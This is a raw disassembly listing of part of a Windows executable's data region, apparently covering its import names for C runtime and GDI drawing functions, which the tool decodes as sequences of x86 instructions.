  4124e7:	add    BYTE PTR [ecx+eiz*1+0x1],bh
  4124eb:	add    BYTE PTR [eax+0x27],ah
  4124ee:	add    DWORD PTR [eax],eax
	...
  4124f8:	jb     0x412533
  4124fa:	add    DWORD PTR [eax],eax
  4124fc:	dec    esp
  4124fd:	and    al,BYTE PTR [ecx]
	...
  412513:	add    BYTE PTR [eax],ah
  412515:	sub    DWORD PTR [ecx],eax
  412517:	add    BYTE PTR [edx],ch
  412519:	sub    DWORD PTR [ecx],eax
  41251b:	add    BYTE PTR [ecx+ebp*1],dh
  41251e:	add    DWORD PTR [eax],eax
  412520:	inc    eax
  412521:	sub    DWORD PTR [ecx],eax
  412523:	add    BYTE PTR [edx+0x29],cl
  412526:	add    DWORD PTR [eax],eax
  412528:	pop    eax
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [edx+0x29],ah
  41252e:	add    DWORD PTR [eax],eax
  412530:	je     0x41255b
  412532:	add    DWORD PTR [eax],eax
  412534:	jle    0x41255f
  412536:	add    DWORD PTR [eax],eax
  412538:	mov    WORD PTR [ecx],gs
  41253a:	add    DWORD PTR [eax],eax
  41253c:	xchg   esi,eax
  41253d:	sub    DWORD PTR [ecx],eax
  41253f:	add    BYTE PTR [esi-0x4ffffed7],ah
  412545:	sub    DWORD PTR [ecx],eax
  412547:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41254e:	add    DWORD PTR [eax],eax
  412550:	aam    0x29
  412552:	add    DWORD PTR [eax],eax
  412554:	loopne 0x41257f
  412556:	add    DWORD PTR [eax],eax
  412558:	jmp    0x129:0xf2000129
  41255f:	add    BYTE PTR [eax],al
  412561:	sub    al,BYTE PTR [ecx]
  412563:	add    BYTE PTR [edx],cl
  412565:	sub    al,BYTE PTR [ecx]
  412567:	add    BYTE PTR [edx+ebp*1],dl
  41256a:	add    DWORD PTR [eax],eax
  41256c:	and    ch,BYTE PTR [edx]
  41256e:	add    DWORD PTR [eax],eax
  412570:	sub    al,0x2a
  412572:	add    DWORD PTR [eax],eax
  412574:	xor    al,0x2a
  412576:	add    DWORD PTR [eax],eax
  412578:	inc    eax
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+0x2a],cl
  41257e:	add    DWORD PTR [eax],eax
  412580:	push   esp
  412581:	sub    al,BYTE PTR [ecx]
  412583:	add    BYTE PTR [esi+0x2a],bl
  412586:	add    DWORD PTR [eax],eax
  412588:	data16 sub al,BYTE PTR [ecx]
  41258b:	add    BYTE PTR [eax+0x2a],dh
  41258e:	add    DWORD PTR [eax],eax
  412590:	jp     0x4125bc
  412592:	add    DWORD PTR [eax],eax
  412594:	sub    BYTE PTR [edx],0x1
  412597:	add    BYTE PTR [esi-0x65fffed6],cl
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x53fffed6],ah
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	retf   0x12a
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    dl,dh
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    dh,bh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	add    BYTE PTR [eax],al
  4125c7:	add    BYTE PTR [edx],bl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [esi],ch
  4125cd:	sub    eax,DWORD PTR [ecx]
  4125cf:	add    BYTE PTR [esi],bh
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4125d7:	add    BYTE PTR [eax+0x2b],bl
  4125da:	add    DWORD PTR [eax],eax
  4125dc:	push   0x7e00012b
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    BYTE PTR [edx-0x59fffed5],dl
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4125f2:	add    DWORD PTR [eax],eax
  4125f4:	loopne 0x412621
  4125f6:	add    DWORD PTR [eax],eax
  4125f8:	in     al,dx
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    dh,bh
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    BYTE PTR [esi],dl
  412601:	sub    al,0x1
  412603:	add    BYTE PTR [eax],ch
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [eax],bh
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [edx+0x2c],al
  41260e:	add    DWORD PTR [eax],eax
  412610:	pop    eax
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [edx+0x2c],dh
  412616:	add    DWORD PTR [eax],eax
  412618:	jle    0x412646
  41261a:	add    DWORD PTR [eax],eax
  41261c:	mov    ch,BYTE PTR [ecx+eax*1]
  41261f:	add    BYTE PTR [esi-0x47fffed4],bl
  412625:	sub    al,0x1
  412627:	add    ah,al
  412629:	sub    al,0x1
  41262b:	add    dl,dl
  41262d:	sub    al,0x1
  41262f:	add    ah,ah
  412631:	sub    al,0x1
  412633:	add    al,dh
  412635:	sub    al,0x1
  412637:	add    BYTE PTR [esi],al
  412639:	sub    eax,0x2d140001
  41263e:	add    DWORD PTR [eax],eax
  412640:	and    ch,BYTE PTR ds:0x2d300001
  412646:	add    DWORD PTR [eax],eax
  412648:	dec    edx
  412649:	sub    eax,0x2d5e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	push   0x2d
  412652:	add    DWORD PTR [eax],eax
  412654:	jp     0x412683
  412656:	add    DWORD PTR [eax],eax
  412658:	xchg   esi,eax
  412659:	sub    eax,0x2da60001
  41265e:	add    DWORD PTR [eax],eax
  412660:	mov    dh,0x2d
  412662:	add    DWORD PTR [eax],eax
  412664:	(bad)  
  412665:	sub    eax,0x2dd20001
  41266a:	add    DWORD PTR [eax],eax
  41266c:	loop   0x41269b
  41266e:	add    DWORD PTR [eax],eax
  412670:	hlt    
  412671:	sub    eax,0x2dfe0001
  412676:	add    DWORD PTR [eax],eax
  412678:	push   cs
  412679:	add    DWORD PTR cs:[eax],eax
  41267c:	push   ds
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	sub    BYTE PTR [esi],ch
  412682:	add    DWORD PTR [eax],eax
  412684:	add    BYTE PTR [eax],al
  412686:	add    BYTE PTR [eax],al
  412688:	dec    edx
  412689:	add    DWORD PTR cs:[eax],eax
  41268c:	add    BYTE PTR [eax],al
  41268e:	add    BYTE PTR [eax],al
  412690:	push   0x8000012e
  412695:	add    DWORD PTR cs:[eax],eax
  412698:	mov    WORD PTR [esi],gs
  41269a:	add    DWORD PTR [eax],eax
  41269c:	call   0x12e:0xb200012e
  4126a3:	add    dh,al
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	fsubr  QWORD PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0xf84127df
  4126b1:	add    DWORD PTR cs:[eax],eax
  4126b4:	adc    BYTE PTR [edi],ch
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	push   ds
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	xor    BYTE PTR [edi],ch
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	inc    eax
  4126c1:	das    
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	push   esi
  4126c5:	das    
  4126c6:	add    DWORD PTR [eax],eax
  4126c8:	data16 das 
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	jbe    0x4126fd
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	mov    ch,BYTE PTR [edi]
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	xchg   esi,eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	mov    dl,0x2f
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	enter  0x12f,0x0
  4126e4:	loopne 0x412715
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	hlt    
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	add    dh,BYTE PTR [eax]
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	sbb    BYTE PTR [eax],dh
  4126f2:	add    DWORD PTR [eax],eax
  4126f4:	xor    BYTE PTR cs:[ecx],al
  4126f7:	add    BYTE PTR [edx],bh
  4126f9:	xor    BYTE PTR [ecx],al
  4126fb:	add    BYTE PTR [eax+0x30],cl
  4126fe:	add    DWORD PTR [eax],eax
  412700:	push   edx
  412701:	xor    BYTE PTR [ecx],al
  412703:	add    BYTE PTR [esi+0x30],ah
  412706:	add    DWORD PTR [eax],eax
  412708:	jbe    0x41273a
  41270a:	add    DWORD PTR [eax],eax
  41270c:	mov    dh,BYTE PTR [eax]
  41270e:	add    DWORD PTR [eax],eax
  412710:	pushf  
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax-0x3bfffed0],dh
  412719:	xor    BYTE PTR [ecx],al
  41271b:	add    ah,dl
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    dl,ch
  412721:	xor    BYTE PTR [ecx],al
  412723:	add    BYTE PTR [edx],al
  412725:	xor    DWORD PTR [ecx],eax
  412727:	add    BYTE PTR [edx],bl
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [esi],ah
  41272d:	xor    DWORD PTR [ecx],eax
  41272f:	add    BYTE PTR [eax],bh
  412731:	xor    DWORD PTR [ecx],eax
  412733:	add    BYTE PTR [edx+0x31],cl
  412736:	add    DWORD PTR [eax],eax
  412738:	push   esi
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [eax+0x31],ch
  41273e:	add    DWORD PTR [eax],eax
  412740:	jbe    0x412773
  412742:	add    DWORD PTR [eax],eax
  412744:	xor    BYTE PTR [ecx],0x1
  412747:	add    BYTE PTR [esi-0x59fffecf],dl
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    BYTE PTR [eax-0x2dfffecf],bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    dl,ch
  412759:	xor    DWORD PTR [ecx],eax
  41275b:	add    BYTE PTR [eax],al
  41275d:	add    BYTE PTR [eax],al
  41275f:	add    BYTE PTR [esi],al
  412761:	xor    al,BYTE PTR [ecx]
  412763:	add    BYTE PTR [edx+esi*1],bl
  412766:	add    DWORD PTR [eax],eax
  412768:	xor    dh,BYTE PTR [edx]
  41276a:	add    DWORD PTR [eax],eax
  41276c:	inc    edx
  41276d:	xor    al,BYTE PTR [ecx]
  41276f:	add    BYTE PTR [edx+0x32],dl
  412772:	add    DWORD PTR [eax],eax
  412774:	pusha  
  412775:	xor    al,BYTE PTR [ecx]
  412777:	add    BYTE PTR [eax+0x32],dh
  41277a:	add    DWORD PTR [eax],eax
  41277c:	test   BYTE PTR [edx],dh
  41277e:	add    DWORD PTR [eax],eax
  412780:	xchg   esp,eax
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    BYTE PTR [eax-0x41fffece],ch
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,cl
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    al,ah
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    al,dh
  412795:	xor    al,BYTE PTR [ecx]
  412797:	add    BYTE PTR [edx],al
  412799:	xor    eax,DWORD PTR [ecx]
  41279b:	add    BYTE PTR [edx],bl
  41279d:	xor    eax,DWORD PTR [ecx]
  41279f:	add    BYTE PTR [esi],ah
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1],dh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	inc    esp
  4127a9:	xor    eax,DWORD PTR [ecx]
  4127ab:	add    BYTE PTR [edx+0x33],dl
  4127ae:	add    DWORD PTR [eax],eax
  4127b0:	push   0x7a000133
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi-0x6bfffecd],al
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    BYTE PTR [esi-0x4bfffecd],ah
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    dh,al
  4127c9:	xor    eax,DWORD PTR [ecx]
  4127cb:	add    al,bl
  4127cd:	xor    eax,DWORD PTR [ecx]
  4127cf:	add    dl,ch
  4127d1:	xor    eax,DWORD PTR [ecx]
  4127d3:	add    dl,bh
  4127d5:	xor    eax,DWORD PTR [ecx]
  4127d7:	add    BYTE PTR [esi],al
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [esp+esi*1],bl
  4127de:	add    DWORD PTR [eax],eax
  4127e0:	cmp    BYTE PTR [ecx+eax*1],dh
  4127e3:	add    BYTE PTR [edx+0x34],dl
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	data16 xor al,0x1
  4127eb:	add    BYTE PTR [esp+esi*1+0x1],dh
  4127ef:	add    BYTE PTR [eax-0x6dfffecc],al
  4127f5:	xor    al,0x1
  4127f7:	add    BYTE PTR [edx-0x51fffecc],ah
  4127fd:	xor    al,0x1
  4127ff:	add    BYTE PTR [edx-0x37fffecc],bh
  412805:	xor    al,0x1
  412807:	add    al,ah
  412809:	xor    al,0x1
  41280b:	add    al,dh
  41280d:	xor    al,0x1
  41280f:	add    BYTE PTR [eax],cl
  412811:	xor    eax,0x351a0001
  412816:	add    DWORD PTR [eax],eax
  412818:	sub    dh,BYTE PTR ds:0x35380001
  41281e:	add    DWORD PTR [eax],eax
  412820:	dec    edx
  412821:	xor    eax,0x35580001
  412826:	add    DWORD PTR [eax],eax
  412828:	fs xor eax,0x35720001
  41282e:	add    DWORD PTR [eax],eax
  412830:	jl     0x412867
  412832:	add    DWORD PTR [eax],eax
  412834:	xchg   esp,eax
  412835:	xor    eax,0x35a40001
  41283a:	add    DWORD PTR [eax],eax
  41283c:	mov    ah,0x35
  41283e:	add    DWORD PTR [eax],eax
  412840:	ret    0x135
  412843:	add    al,dl
  412845:	xor    eax,0x35e00001
  41284a:	add    DWORD PTR [eax],eax
  41284c:	div    BYTE PTR ds:0x36080001
  412852:	add    DWORD PTR [eax],eax
  412854:	push   ss
  412855:	add    DWORD PTR ss:[eax],eax
  412858:	sub    al,0x36
  41285a:	add    DWORD PTR [eax],eax
  41285c:	cmp    dh,BYTE PTR [esi]
  41285e:	add    DWORD PTR [eax],eax
  412860:	push   edx
  412861:	add    DWORD PTR ss:[eax],eax
  412864:	pop    esi
  412865:	add    DWORD PTR ss:[eax],eax
  412868:	push   0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	jbe    0x4128a4
  41286e:	add    DWORD PTR [eax],eax
  412870:	test   BYTE PTR [esi],dh
  412872:	add    DWORD PTR [eax],eax
  412874:	xchg   esi,eax
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	mov    ds:0xb4000136,al
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	shl    BYTE PTR [esi],0x1
  412883:	add    dh,cl
  412885:	add    DWORD PTR ss:[eax],eax
  412888:	fdiv   QWORD PTR [esi]
  41288a:	add    DWORD PTR [eax],eax
  41288c:	call   0xf64129c7
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	add    al,0x37
  412896:	add    DWORD PTR [eax],eax
  412898:	adc    al,0x37
  41289a:	add    DWORD PTR [eax],eax
  41289c:	es aaa 
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	cmp    al,0x37
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	inc    esi
  4128a5:	aaa    
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	push   esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	fs aaa 
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	jbe    0x4128e9
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	test   BYTE PTR [edi],dh
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	cwde   
  4128b9:	aaa    
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    dl,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	les    esi,FWORD PTR [edi]
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	aam    0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	call   0xfa412a04
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	or     bh,BYTE PTR [eax]
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	push   ss
  4128d5:	cmp    BYTE PTR [ecx],al
  4128d7:	add    BYTE PTR [eax+edi*1],dh
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	inc    esi
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1+0x1],bl
  4128e3:	add    BYTE PTR [eax+0x38],bh
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	nop
  4128e9:	cmp    BYTE PTR [ecx],al
  4128eb:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	mov    edx,0xc8000138
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    ah,ah
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dl,dh
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    BYTE PTR [esi],al
  412905:	cmp    DWORD PTR [ecx],eax
  412907:	add    BYTE PTR [eax],bl
  412909:	cmp    DWORD PTR [ecx],eax
  41290b:	add    BYTE PTR [edx],ch
  41290d:	cmp    DWORD PTR [ecx],eax
  41290f:	add    BYTE PTR [edx],bh
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [eax+0x39],dl
  412916:	add    DWORD PTR [eax],eax
  412918:	cmp    WORD PTR [ecx],ax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    al,ch
  412921:	add    esi,DWORD PTR [ebx+0x74]
  412924:	jb     0x412989
  412926:	jo     0x4129a1
  412928:	add    BYTE PTR [eax],al
  41292a:	or     eax,0x676e7504
  41292f:	gs je  0x412995
  412932:	add    BYTE PTR [eax],al
  412934:	pop    edi
  412935:	add    esp,DWORD PTR [ebx+0x6c]
  412938:	gs popa 
  41293a:	jb     0x4129a1
  41293c:	jb     0x4129b0
  41293e:	add    BYTE PTR [eax],al
  412940:	sub    BYTE PTR [edi+esi*2],al
  412943:	arpl   WORD PTR [ebx+0x6e],si
  412946:	arpl   WORD PTR [ebp+0x70],bp
  412949:	add    ch,dh
  41294b:	add    BYTE PTR [edi+0x63],bl
  41294e:	outs   dx,DWORD PTR ds:[esi]
  41294f:	outs   dx,BYTE PTR ds:[esi]
  412950:	je     0x4129c4
  412952:	outs   dx,DWORD PTR ds:[esi]
  412953:	ins    BYTE PTR es:[edi],dx
  412954:	data16 jo 0x412957
  412957:	add    BYTE PTR [ebp+0x6c616d03],dh
  41295d:	ins    BYTE PTR es:[edi],dx
  41295e:	outs   dx,DWORD PTR ds:[esi]
  41295f:	arpl   WORD PTR [eax],ax
  412961:	add    BYTE PTR [ebx+0x735f5f00],dh
  412967:	gs je  0x4129c9
  41296a:	popa   
  41296b:	jo     0x4129dd
  41296d:	pop    edi
  41296e:	je     0x4129e9
  412970:	jo     0x4129d7
  412972:	add    BYTE PTR [eax],al
  412974:	add    eax,DWORD PTR [ebx+esi*2]
  412977:	jns    0x4129ec
  412979:	je     0x4129e0
  41297b:	ins    DWORD PTR es:[edi],dx
  41297c:	add    BYTE PTR [eax],al
  41297e:	mov    al,ds:0x705f5f00
  412983:	pop    edi
  412984:	pop    edi
  412985:	ins    WORD PTR es:[edi],dx
  412987:	outs   dx,DWORD PTR ds:[esi]
  412988:	fs add BYTE PTR gs:[eax],al
  41298c:	pop    ebp
  41298d:	add    esp,DWORD PTR [ebx+0x61]
  412990:	ins    BYTE PTR es:[edi],dx
  412991:	ins    BYTE PTR es:[edi],dx
  412992:	outs   dx,DWORD PTR ds:[esi]
  412993:	arpl   WORD PTR [eax],ax
  412995:	add    BYTE PTR [ebx+0x705f5f00],bl
  41299b:	pop    edi
  41299c:	pop    edi
  41299d:	arpl   WORD PTR [edi+0x6d],bp
  4129a0:	ins    DWORD PTR es:[edi],dx
  4129a1:	outs   dx,DWORD PTR ds:[esi]
  4129a2:	fs add BYTE PTR gs:[eax],al
  4129a6:	std    
  4129a7:	add    esi,DWORD PTR [ebx+0x74]
  4129aa:	jb     0x412a20
  4129ac:	outs   dx,DWORD PTR ds:[esi]
  4129ad:	jne    0x412a1b
  4129af:	add    BYTE PTR [esi],dl
  4129b1:	add    al,0x76
  4129b3:	jae    0x412a25
  4129b5:	jb     0x412a20
  4129b7:	outs   dx,BYTE PTR ds:[esi]
  4129b8:	je     0x412a20
  4129ba:	add    BYTE PTR [eax],al
  4129bc:	sub    al,0x4
  4129be:	ja     0x412a23
  4129c0:	jae    0x412a32
  4129c2:	bound  esi,QWORD PTR [edx+0x6b]
  4129c5:	add    bl,bl
  4129c7:	add    BYTE PTR [edi+0x61],bl
  4129ca:	ins    DWORD PTR es:[edi],dx
  4129cb:	jae    0x412a34
  4129cd:	pop    edi
  4129ce:	gs js  0x412a3a
  4129d1:	je     0x4129d3
  4129d3:	add    BYTE PTR [esi+0x6e695f01],al
  4129d9:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x94006d72
  4129e1:	add    ebp,DWORD PTR [ecx+0x73]
  4129e4:	popa   
  4129e5:	ins    BYTE PTR es:[edi],dx
  4129e6:	outs   dx,BYTE PTR ds:[esi]
  4129e7:	jne    0x412a56
  4129e9:	add    BYTE PTR [ebp+0x3],ch
  4129ec:	data16 addr16 gs je 0x412a54
  4129f1:	add    BYTE PTR [esi+0x73695f01],bl
  4129f7:	ins    DWORD PTR es:[edi],dx
  4129f8:	bound  esp,QWORD PTR [edx+0x6c]
  4129fb:	gs popa 
  4129fd:	add    BYTE PTR fs:[eax],al
  412a00:	pop    ebx
  412a01:	add    esp,DWORD PTR [edx+0x73]
  412a04:	gs popa 
  412a06:	jb     0x412a6b
  412a08:	push   0x7303e500
  412a0d:	je     0x412a81
  412a0f:	arpl   WORD PTR [eax+0x72],bp
  412a12:	add    BYTE PTR [eax],al
  412a14:	push   edx
  412a15:	add    BYTE PTR [edi+0x58],bl
  412a18:	arpl   WORD PTR [eax+0x74],si
  412a1b:	inc    esi
  412a1c:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3e70072
  412a24:	jae    0x412a9a
  412a26:	jb     0x412a8b
  412a28:	outs   dx,DWORD PTR ds:[esi]
  412a29:	ins    BYTE PTR es:[edi],dx
  412a2a:	ins    BYTE PTR es:[edi],dx
  412a2b:	add    BYTE PTR [esi],al
  412a2d:	add    al,0x74
  412a2f:	imul   ebp,DWORD PTR [ebp+0x65],0x3b10000
  412a36:	ins    BYTE PTR es:[edi],dx
  412a37:	outs   dx,DWORD PTR ds:[esi]
  412a38:	arpl   WORD PTR [ecx+0x6c],sp
  412a3b:	je     0x412aa6
  412a3d:	ins    DWORD PTR es:[edi],dx
  412a3e:	add    BYTE PTR gs:[eax],bh
  412a41:	add    al,0x77
  412a43:	arpl   WORD PTR [ebx+0x74],si
  412a46:	outs   dx,DWORD PTR ds:[esi]
  412a47:	jne    0x412ab5
  412a49:	add    BYTE PTR [ecx],ah
  412a4b:	add    al,0x77
  412a4d:	arpl   WORD PTR [ebx+0x63],si
  412a50:	jo     0x412acb
  412a52:	add    BYTE PTR [eax],al
  412a54:	enter  0x7003,0x75
  412a58:	je     0x412abd
  412a5a:	push   0x78007261
  412a5f:	add    esp,DWORD PTR [esi+0x70]
  412a62:	jne    0x412ad8
  412a64:	arpl   WORD PTR [eax],ax
  412a66:	sbb    al,0x4
  412a68:	ja     0x412acd
  412a6a:	jae    0x412acf
  412a6c:	popa   
  412a6d:	je     0x412a6f
  412a6f:	add    dl,ch
  412a71:	add    esi,DWORD PTR [ebx+0x74]
  412a74:	jb     0x412ad9
  412a76:	jae    0x412ae8
  412a78:	outs   dx,BYTE PTR ds:[esi]
  412a79:	add    BYTE PTR [ebx+0x65736603],al
  412a7f:	imul   eax,DWORD PTR gs:[eax],0xffffffb7
  412a83:	add    ebp,DWORD PTR [ebp+0x62]
  412a86:	jae    0x412afc
  412a88:	outs   dx,DWORD PTR ds:[esi]
  412a89:	ja     0x412aee
  412a8b:	jae    0x412a8d
  412a8d:	add    BYTE PTR [ebx],cl
  412a8f:	add    al,0x74
  412a91:	outs   dx,DWORD PTR ds:[esi]
  412a92:	ja     0x412b00
  412a94:	outs   dx,DWORD PTR ds:[esi]
  412a95:	ja     0x412afc
  412a97:	jb     0x412a99
  412a99:	add    ah,cl
  412a9b:	add    esi,DWORD PTR [ecx+0x73]
  412a9e:	outs   dx,DWORD PTR ds:[esi]
  412a9f:	jb     0x412b15
  412aa1:	add    BYTE PTR [ecx],al
  412aa3:	add    al,0x73
  412aa5:	ja     0x412b1a
  412aa7:	arpl   WORD PTR [ecx+0x6e],sp
  412aaa:	data16 add BYTE PTR [ebx],ah
  412aad:	add    DWORD PTR [edi+0x65],ebx
  412ab0:	js     0x412b1b
  412ab2:	je     0x412ab4
  412ab4:	ss add al,0x77
  412ab7:	arpl   WORD PTR [ebx+0x74],si
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	ins    DWORD PTR es:[edi],dx
  412abc:	bound  esi,QWORD PTR [ebx+0x0]
  412abf:	add    al,ch
  412ac1:	add    BYTE PTR [edi+0x63],bl
  412ac4:	gs js  0x412b30
  412ac7:	je     0x412ac9
  412ac9:	add    BYTE PTR [ecx],ch
  412acb:	add    al,0x77
  412acd:	arpl   WORD PTR [ebx+0x6e],si
  412ad0:	arpl   WORD PTR [eax+0x79],si
  412ad3:	add    BYTE PTR [ebx+0x70736903],bl
  412ad9:	jb     0x412b44
  412adb:	outs   dx,BYTE PTR ds:[esi]
  412adc:	je     0x412ade
  412ade:	mov    ch,0x0
  412ae0:	pop    edi
  412ae1:	pop    edi
  412ae2:	jae    0x412b49
  412ae4:	je     0x412b5b
  412ae6:	jae    0x412b4d
  412ae8:	jb     0x412b57
  412aea:	popa   
  412aeb:	je     0x412b55
  412aed:	gs jb  0x412b62
  412af0:	add    BYTE PTR [eax],al
  412af2:	sbb    BYTE PTR [esi+esi*2],al
  412af5:	jae    0x412b6e
  412af7:	jo     0x412b6b
  412af9:	imul   ebp,DWORD PTR [esi+0x74],0x720066
  412b00:	pop    edi
  412b01:	pop    edi
  412b02:	addr16 gs je 0x412b73
  412b06:	popa   
  412b07:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b0e:	dec    ebp
  412b0f:	push   ebx
  412b10:	push   esi
  412b11:	inc    ebx
  412b12:	push   edx
  412b13:	push   esp
  412b14:	cs fs ins BYTE PTR es:[edi],dx
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	add    BYTE PTR [eax],al
  412b1a:	fadd   QWORD PTR [ecx]
  412b1c:	push   ebx
  412b1d:	gs je  0x412b64
  412b20:	dec    ecx
  412b21:	inc    edx
  412b22:	inc    ebx
  412b23:	outs   dx,DWORD PTR ds:[esi]
  412b24:	ins    BYTE PTR es:[edi],dx
  412b25:	outs   dx,DWORD PTR ds:[esi]
  412b26:	jb     0x412b7c
  412b28:	popa   
  412b29:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b2d:	add    bh,dl
  412b2f:	add    DWORD PTR [ebx+0x65],edx
  412b32:	je     0x412b76
  412b34:	jb     0x412bab
  412b36:	jae    0x412ba0
  412b38:	dec    edi
  412b39:	jb     0x412ba2
  412b3b:	inc    ebp
  412b3c:	js     0x412b3e
  412b3e:	add    DWORD PTR [eax],0x626d6f43
  412b44:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  412b4b:	add    BYTE PTR [ecx+eax*1],ah
  412b4e:	inc    edi
  412b4f:	gs je  0x412b94
  412b52:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  412b56:	gs add bh,cl
  412b59:	add    DWORD PTR [ebx+0x65],edx
  412b5c:	ins    BYTE PTR es:[edi],dx
  412b5d:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  412b62:	ins    BYTE PTR es:[edi],dx
  412b63:	gs je  0x412bda
  412b66:	add    BYTE PTR gs:[ecx+0x65724300],cl
  412b6d:	popa   
  412b6e:	je     0x412bd5
  412b70:	inc    edx
  412b71:	jb     0x412be8
  412b73:	jae    0x412bdd
  412b75:	dec    ecx
  412b76:	outs   dx,BYTE PTR ds:[esi]
  412b77:	imul   esi,DWORD PTR fs:[edx+0x65],0xaa007463
  412b7f:	add    BYTE PTR [ebx+0x72],al
  412b82:	gs popa 
  412b84:	je     0x412beb
  412b86:	push   eax
  412b87:	outs   dx,DWORD PTR ds:[esi]
  412b88:	ins    BYTE PTR es:[edi],dx
  412b89:	jns    0x412bf2
  412b8b:	outs   dx,DWORD PTR ds:[esi]
  412b8c:	outs   dx,BYTE PTR ds:[esi]
  412b8d:	push   edx
  412b8e:	outs   dx,BYTE PTR ds:[si]
  412b90:	add    BYTE PTR [eax],al
  412b92:	mov    al,ds:0x65724300
  412b97:	popa   
  412b98:	je     0x412bff
  412b9a:	dec    eax
  412b9b:	popa   
  412b9c:	je     0x412c01
  412b9e:	push   0x73757242
  412ba3:	push   0x17a0000
  412ba8:	inc    edi
